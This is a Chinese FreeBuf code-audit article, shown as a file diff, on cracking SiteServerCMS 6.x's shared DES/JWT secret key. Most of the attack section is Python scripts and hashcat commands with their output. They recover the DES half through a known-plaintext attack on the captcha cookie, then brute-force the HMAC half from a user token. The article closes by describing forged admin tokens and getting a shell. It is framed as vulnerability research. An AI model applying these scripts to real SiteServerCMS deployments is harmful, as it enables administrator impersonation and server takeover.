@@ -1,0 +1,291 @@
+**免责声明：本文中提到的漏洞利用Poc和脚本仅供研究学习使用，请遵守《网络安全法》等相关法律法规。**
+
+## 一、前言
+
+加密和签名本着使数据更安全，但有时它们在一起的时候也会产生相反的效果。
+
+多天前，SiteServerCMS官方Github在7.x版本的一个commit更新了`securityKey`的生成算法：
+
+<https://github.com/siteserver/cms/commit/1bbdc5fc8f6a8755d10954f72ad9e3970035a97e>
+
+![](https://image.3001.net/images/20200421/1587478697_5e9f00a92e73a.png!small)
+
+增加了`securityKey`的长度，之前是16字节的0-f字符串，直接暴破16字节的密钥还是比较难的。
+
+但，如果使用不当，就会使原本具有一定强度的密钥变弱，大大的降低攻击成本，可以在短时间内计算出来。
+
+接着上一篇[《代码审计 |
+SiteServerCMS身份认证机制》](https://www.freebuf.com/vuls/228448.html)最后一个问题继续探讨一下密钥攻击。
+
+## 二、JWT 和 DES
+
+在往下之前先回顾一下JWT和DES CBC模式。
+
+### 2.1 JWT
+
+JSON Web Token（JWT）是一个开放标准，通常用于信息交换，其令牌结构由三部分组成：
+
+> Header，头部，一般是标明使用的算法类型；
+>
+> Payload，有效载荷，一般是要交互的数据；
+>
+> Signature，签名，一般是数据的hash摘要。
+
+各部分由`点（.）`号进行分隔，格式如下：
+
+    
+    
+    Header.Payload.Signature
+    
+
+### 2.2 DES
+
+DES算法的密钥为8字节，其密文分组链接模式（Cipher Block Chaining,
+CBC）特点是首先将明文分组与前一个密文分组（第一组与初始向量IV）进行XOR运算，然后进行加密，如图：
+
+![](https://image.3001.net/images/20200421/1587478719_5e9f00bf743b6.png!small)
+
+《图解密码技术（第3版）》
+
+## 三、弱密钥攻击
+
+上一篇讲到`SecretKey`是由`GetShortGuid()`生成的16字节0-f小写的字符串，由于DES加密和JWT签名哈希都是使用同一密钥`SecretKey`进行计算，这导致可以将16字节的密钥拆成2个8字节字符串进行本地爆破。
+
+### 3.1 获取DES密钥
+
+SiteServerCMS使用的是DES CBC模式的加密算法，已知固定IV：
+
+    
+    
+    byte[] iv = { 0×12, 0×34, 0×56, 0×78, 0×90, 0xAB, 0xCD, 0xEF };
+    
+
+那么，我们就可以有：
+
+    
+    
+     加密中间数据 = 明文 XOR IV
+    
+
+如果能找到一组明文和密文对应组，就可以进行已知明文攻击，爆破8字节密钥Key。
+
+举个例子，登录验证码是经过DES加密的，查看Cookie我们就可以得到一组明文和对应的一组密文：
+
+    
+    
+    前台： http://10.250.0.3:8062/home/pages/login.html
+    后台： http://10.250.0.3:8062/SiteServer/pageLogin.cshtml
+    
+
+![](https://image.3001.net/images/20200421/1587478756_5e9f00e4588e3.png!small)
+
+    
+    
+    pM44 : tiUDU5G1PJE0equals00secret0
+    
+    
+    
+    from siteservercms_v6 import *
+    
+    def bxor(b1, b2): # bytes
+        result = bytearray()
+        for b1, b2 in zip(b1, b2):
+            result.append(b1 ^ b2)
+        return result
+    
+    def get_keya(ct, pt, iv):
+        # 第一组密文，8字节
+        st = base64.b64decode(b64_de_replace(ct)).hex()[:16]   
+    
+        # 第一组明文 XOR IV
+        md = bxor(pt, iv).hex()
+    
+        print('hashcat -m 14000 {}:{} -a 3 "?h?h?h?h?h?h?h?h" --force'.format(st, md))
+    
+    pt = b'pM44' + b'\x04' * 4  # 验证码，PKCS7填充
+    ct = 'tiUDU5G1PJE0equals00secret0'
+    iv = b'\x12\x34\x56\x78\x90\xAB\xCD\xEF'
+    
+    get_keya(ct, pt , iv)
+    
+
+运行直接获取 hashcat 脚本：
+
+    
+    
+    hashcat -m 14000 b625035391b53c91:6279624c94afc9eb -a 3 "?h?h?h?h?h?h?h?h" --force
+    
+
+![](https://image.3001.net/images/20200421/1587478770_5e9f00f215b51.png!small)
+
+    
+    
+    b625035391b53c91:6279624c94afc9eb:d78e2f50
+    
+
+8字节字符串基本是秒破，这里获取8字节密钥的只是等效密钥，有可能并不是真正的密钥，对于6.0以下版本足够拿去直接Getshell了，但对于6.x版本来说，还差后8字节密钥才能去干点什么。
+
+由于DES密钥有效比特位是56位，有8位是校验位。这时，需要计算等效密钥的所有可能性，那样就会有多组DES密钥，由于字符串是由0-f组成，那么就会出现32组、64组、128组...都是等效的情况，这跟随机出来的密钥有关，最坏的情况是2^8=256组。
+
+    
+    
+    # 获取等效密钥组
+    def get_key_list(key): 
+        result = [key]
+        for i in range(len(key)):
+            for k in result:
+                t = list(k)
+                s = chr(ord(t[i]) ^ 1)
+                if s in '1234567890abcdef':
+                    t[i] = s
+                    n = ''.join(t)
+                    if n not in result:
+                        result.append(n)
+    
+        return result
+    
+    keya = 'd78e2f50' 
+    print(get_key_list(keya))
+    
+
+拿前面获取的Key计算一下，人品不行，有128组：
+
+    
+    
+    ['d78e2f50', 'e78e2f50', 'd68e2f50', 'e68e2f50', 'd79e2f50', 'e79e2f50', 'd69e2f50', 'e69e2f50', 'd78d2f50', 'e78d2f50', 'd68d2f50', 'e68d2f50', 'd79d2f50', 'e79d2f50', 'd69d2f50', 'e69d2f50', 'd78e3f50', 'e78e3f50', 'd68e3f50', 'e68e3f50', 'd79e3f50', 'e79e3f50', 'd69e3f50', 'e69e3f50', 'd78d3f50', 'e78d3f50', 'd68d3f50', 'e68d3f50', 'd79d3f50', 'e79d3f50', 'd69d3f50', 'e69d3f50', 'd78e2f40', 'e78e2f40', 'd68e2f40', 'e68e2f40', 'd79e2f40', 'e79e2f40', 'd69e2f40', 'e69e2f40', 'd78d2f40', 'e78d2f40', 'd68d2f40', 'e68d2f40', 'd79d2f40', 'e79d2f40', 'd69d2f40', 'e69d2f40', 'd78e3f40', 'e78e3f40', 'd68e3f40', 'e68e3f40', 'd79e3f40', 'e79e3f40', 'd69e3f40', 'e69e3f40', 'd78d3f40', 'e78d3f40', 'd68d3f40', 'e68d3f40', 'd79d3f40', 'e79d3f40', 'd69d3f40', 'e69d3f40', 'd78e2f51', 'e78e2f51', 'd68e2f51', 'e68e2f51', 'd79e2f51', 'e79e2f51', 'd69e2f51', 'e69e2f51', 'd78d2f51', 'e78d2f51', 'd68d2f51', 'e68d2f51', 'd79d2f51', 'e79d2f51', 'd69d2f51', 'e69d2f51', 'd78e3f51', 'e78e3f51', 'd68e3f51', 'e68e3f51', 'd79e3f51', 'e79e3f51', 'd69e3f51', 'e69e3f51', 'd78d3f51', 'e78d3f51', 'd68d3f51', 'e68d3f51', 'd79d3f51', 'e79d3f51', 'd69d3f51', 'e69d3f51', 'd78e2f41', 'e78e2f41', 'd68e2f41', 'e68e2f41', 'd79e2f41', 'e79e2f41', 'd69e2f41', 'e69e2f41', 'd78d2f41', 'e78d2f41', 'd68d2f41', 'e68d2f41', 'd79d2f41', 'e79d2f41', 'd69d2f41', 'e69d2f41', 'd78e3f41', 'e78e3f41', 'd68e3f41', 'e68e3f41', 'd79e3f41', 'e79e3f41', 'd69e3f41', 'e69e3f41', 'd78d3f41', 'e78d3f41', 'd68d3f41', 'e68d3f41', 'd79d3f41', 'e79d3f41', 'd69d3f41', 'e69d3f41']
+    
+
+### 3.2 获取JWT密钥
+
+还剩下8字节密钥，直接拿等效密钥组进行拼接循环爆破即可获得JWT 16字节的签名密钥`SecretKey`，那爆破如何验证密钥后面8字节的正确性？
+
+上篇讲到，SiteServerCMS JWT的格式：
+
+    
+    
+    {"typ":"JWT","alg":"HS256"}.{"UserId":1,"UserName":"admin","ExpiresAt":"\/Date(时间戳))\/"}.哈希摘要
+    
+
+`accessToken`的格式：
+
+    
+    
+    算法类型 + 认证信息 + 哈希摘要
+    Base64UrlEncode(headerBytes) + "." + Base64UrlEncode(payloadBytes) + "." + Base64UrlEncode(signature)
+    
+
+我们只需要去前台随便注册一个用户，然后登录获取用户Cookie中的`SS-USER-TOKEN`：
+
+![](https://image.3001.net/images/20200421/1587478783_5e9f00ff59ec7.png!small)
+
+    
+    
+    SS-USER-TOKEN : miwSyMrZkrJd0slash0y2v1vmYi2SQmsVxvzJm2kyerBmpzHqZvyr2mFCONEeBNiQmnHvAB0slash091aIXgky0uXXLo2mhhNpwfOLC0add03CxWLOxagungkttJcTIxPKgUosbkNGNoXUD5gUf70add0z6pJBihGUowi8xxOLmsdzk8PMjzeQ1zpNWvkyBqc00slash0Igtyzw90slash0aQD1eT3ZMaZIJl1Sccue7vUlJt4ZIRxflikVgHi0slash0muAjrEACajO80equals00secret0
+    
+
+由于JWT头部分是固定的，前面获取hashcat脚本也可以通过`accessToken`直接获取：
+
+    
+    
+    pt = bytes('eyJ0eXAi', 'ASCII')  # 'eyJ0eXAi' = base64('{"typ"')
+    ct = SS-USER-TOKEN
+    
+    get_des_hashcat_str(ct, pt , iv)
+    
+
+接下来我们需要获取签名的哈希摘要字符串，一个可以从未加密的`SS-USER-TOKEN-CLIENT`里获取，另一个可以从加密的`SS-USER-TOKEN`里获取（拿前面获取的等效密钥解密）：
+
+    
+    
+    from siteservercms_v6 import *
+    
+    ct = SS-USER-TOKEN
+    keya = 'd78e2f50'
+    ss_at = decrypt(ct, keya, iv).split('.')
+    st_hmac = base64_url_decode(ss_at[2]).hex()
+    print(st_hmac)
+    
+
+获取得到签名哈希摘要：
+
+    
+    
+    1db8dd410455cf1de31f24b57bc60a81298fe346005b11953733a12a3a06c618
+    
+
+然后就可以通过前面的等效密钥组生成hashcat爆破脚本：
+
+    
+    
+    def get_keyb(ct, keya, iv):
+        keyb_list = get_key_list(keya)
+    
+        ss_at = decrypt(ct, keya, iv).split('.')
+    
+        ss_pt = ss_at[0] + '.' + ss_at[1]
+        st_hmac = base64_url_decode(ss_at[2]).hex()
+    
+        with open('keyb.sh', 'wt') as fs:
+            for k in keyb_list:
+                hs = 'hashcat -m 1450 {}:{} -a 3 "{}?h?h?h?h?h?h?h?h" --force{}'.format(st_hmac, ss_pt, k, "\n")
+                fs.write(hs)
+        print('$ bash keyb.sh')
+    
+    ct = SS-USER-TOKEN
+    keya = 'd78e2f50'
+    iv = b'\x12\x34\x56\x78\x90\xAB\xCD\xEF'
+    get_keyb(ct, keya, iv)
+    
+
+采用生成一个Shell脚本的方式进行批量破解，由于hashcat破解成功会自动跳过后面的脚本，不必担心成功后还做无用计算。
+
+也可以采用字典+掩码模式，测试发现掩码右拼接的速度比左拼接的速度慢很多，比单条计算也慢很多，不知啥原因。。。
+
+    
+    
+    with open('keyb.txt', 'wt') as fs:
+        for k in keyb_list:
+            fs.write("{}\r\n".format(k))
+    print('hashcat -m 1450 {}:{} -a 6 key2.txt "?h?h?h?h?h?h?h?h" --force'.format(st_hmac, ss_pt))
+    
+
+最终采用Shell脚本单条依次计算的方式，执行完会在当前目录生存成一个`keyb.sh`的脚本文件，跑就是了：
+
+    
+    
+    $ bash keyb.sh
+    
+
+![](https://image.3001.net/images/20200421/1587478796_5e9f010c2cd6d.png!small)
+
+由于需要大量hash的计算，这里的计算稍微会比较慢，我这渣渣笔记本跑完一组密钥组合要3～5分钟左右，128组大概就是 128 * 4 = 512分钟，
+这也是拼人品的，如果正确密钥比较靠前，几分钟就出来，如果比较靠后，估计跑完也要10来小时。
+
+计算快慢除了人品，还跟配置有关，一般的电脑如果死磕一个晚上也差不多出来了。
+
+这里就不做演示了，直接去网站配置文件确认一下密钥前8字节在不在生成的等效密钥组里：
+
+    
+    
+    python3 test.py | grep --color d68d2f41
+    
+
+![](https://image.3001.net/images/20200421/1587478808_5e9f011839c5c.png!small)
+
+跑完直接查看结果：
+
+    
+    
+    $ cat ~/.hashcat/hashcat.potfile 
+    b625035391b53c91:6279624c94afc9eb:d78e2f50
+    1db8dd410455cf1de31f24b57bc60a81298fe346005b11953733a12a3a06c618:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJVc2VySWQiOjEsIlVzZXJOYW1lIjoidGVzdCIsIkV4cGlyZXNBdCI6IlwvRGF0ZSgxNTg4MDQ1NjcxMzkyKVwvIn0:d68d2f41d7497659
+    
+
+拿到了16字节的密钥，根据上一篇操作，就可以直接`get_access_token`伪造管理员登录后台进行Getshell。
+
+## 四、最后
+
+虽然攻击成本有点高，需要点时间计算，但利用条件低。获取密钥后进一步攻击后台的成功率也高，一般UID为1的用户名是admin或siteserver，如果不是，只需要UID和UNAME进行交叉遍历即可。
+
+ ***本文作者：zrools，转载请注明来自FreeBuf.COM**
+
